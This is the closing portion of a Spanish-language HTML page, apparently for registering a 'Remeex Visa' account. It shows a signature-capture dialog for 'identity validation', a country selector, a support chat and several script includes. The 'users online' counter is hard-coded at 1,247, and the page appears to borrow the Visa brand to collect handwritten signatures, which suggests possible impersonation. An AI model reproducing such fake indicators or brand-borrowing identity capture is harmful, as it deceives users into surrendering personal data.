                        <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path>
                    </svg>
                    <span>Soporte</span>
                </button>
                <div class="support-chat" aria-hidden="true">
                    <div id="tawkto-loader" class="tawkto-loader" aria-hidden="true">
                        <div class="tawkto-loader__circle">
                            <div class="tawkto-loader__spinner" aria-hidden="true"></div>
                        </div>
                    </div>
                    <div id="tawkto-container" class="tawkto-container" aria-live="polite" aria-hidden="true"></div>
                </div>
            </div>
            <div class="users-online" id="usersOnline">
                <div class="status-led"></div>
                <span class="users-count" id="usersCount">1,247</span>
                <span class="users-text">usuarios conectados</span>
            </div>
        </div>
        </div>

    <div class="connection-overlay" id="signatureOverlay" role="dialog" aria-modal="true" aria-hidden="true">
        <div class="connection-overlay-card signature-overlay-card">
            <div class="signature-overlay-header">
                <div class="connection-overlay-icon" aria-hidden="true">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                        <path d="m20.4 5.6-9.9 9.9a4 4 0 0 1-1.8 1l-4.7 1.2 1.2-4.7a4 4 0 0 1 1-1.8l9.9-9.9a2.5 2.5 0 0 1 3.5 0l0.8 0.8a2.5 2.5 0 0 1 0 3.5Z"></path>
                        <path d="M13.5 6.5 17.5 10.5"></path>
                        <path d="M5 21h14"></path>
                    </svg>
                </div>
                <div class="signature-overlay-titles">
                    <h2 class="connection-overlay-title" id="signatureOverlayTitle">Captura tu firma</h2>
                    <p class="connection-overlay-text" id="signatureOverlayDescription">Traza tu firma dentro del recuadro para validar tu identidad digital.</p>
                </div>
            </div>
            <div class="signature-overlay-body">
                <div class="signature-overlay-guidelines">
                    <h3>Recomendaciones rápidas</h3>
                    <ul>
                        <li>Utiliza un trazo continuo y legible dentro del recuadro.</li>
                        <li>Asegúrate de que la firma ocupe la mayor parte del espacio disponible.</li>
                        <li>Si necesitas corregirla, selecciona <strong>Borrar</strong> y vuelve a intentarlo.</li>
                    </ul>
                </div>
                <div class="signature-canvas-wrapper">
                    <div class="signature-canvas-inner">
                        <canvas id="signatureCanvas" width="600" height="260" tabindex="0" aria-describedby="signatureOverlayDescription"></canvas>
                        <div class="signature-canvas-placeholder" id="signatureCanvasPlaceholder" aria-hidden="true">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M4 15.5c1.6-3.3 3.4-5 5.2-4.9 2 .1 2.9 2.2 4 4.9 1-2.7 2.4-5.1 4.4-5.6 1.6-.4 2.7.7 3.4 2.4"></path>
                                <path d="M4 19.5h16"></path>
                            </svg>
                            <span>Dibuja tu firma aquí</span>
                        </div>
                    </div>
                    <p class="signature-overlay-hint">Esta firma se utilizará para validar solicitudes sensibles dentro de tu cuenta.</p>
                </div>
            </div>
            <div class="connection-overlay-actions signature-overlay-actions">
                <button class="btn btn-secondary" type="button" id="signatureClose">
                    <span>Cerrar</span>
                    <div class="btn-ripple"></div>
                </button>
                <button class="btn btn-secondary" type="button" id="signatureClear">
                    <span>Borrar</span>
                    <div class="btn-ripple"></div>
                </button>
                <button class="btn btn-primary" type="button" id="signatureConfirm" disabled>
                    <span>Confirmar firma</span>
                    <div class="btn-ripple"></div>
                </button>
            </div>
        </div>
    </div>

    <!-- Música de bienvenida -->
    <audio id="introMusic" preload="auto">
        <source src="remeexvisa.ogg" type="audio/ogg">
    </audio>

    <!-- Inline scripts consolidated into external bundle -->
    <div class="loading-overlay" id="loading-overlay" aria-label="Cargando">
        <div class="spinner"></div>
        <div class="loading-text">Cargando...</div>
    </div>
    <div class="country-overlay" id="countryOverlay" aria-hidden="true">
        <div class="country-modal" role="dialog" aria-modal="true" aria-labelledby="countryOverlayTitle">
            <button type="button" class="country-modal__close" id="countryOverlayClose" aria-label="Cerrar selector de país">
                <span aria-hidden="true">&times;</span>
            </button>
            <div class="country-modal__header">
                <h2 id="countryOverlayTitle">Selecciona tu país</h2>
                <p>Elige el país desde el cual estás completando el registro de tu cuenta Visa.</p>
            </div>
            <div class="country-modal__list" id="countryOverlayList" role="listbox" aria-labelledby="countryOverlayTitle"></div>
            <div class="country-modal__footer">
                Mostramos únicamente los países habilitados para esta experiencia de registro.
            </div>
        </div>
    </div>

    <script src="preload.js"></script>
    <script src="js/tawk-support.js" defer></script>
    <script type="module" src="registro-forwarder.js"></script>
    <script src="/tracker.js" defer></script>
    <!-- Supabase Integration -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="js/supabase-client-frontend.js"></script>
</body>
</html>
       
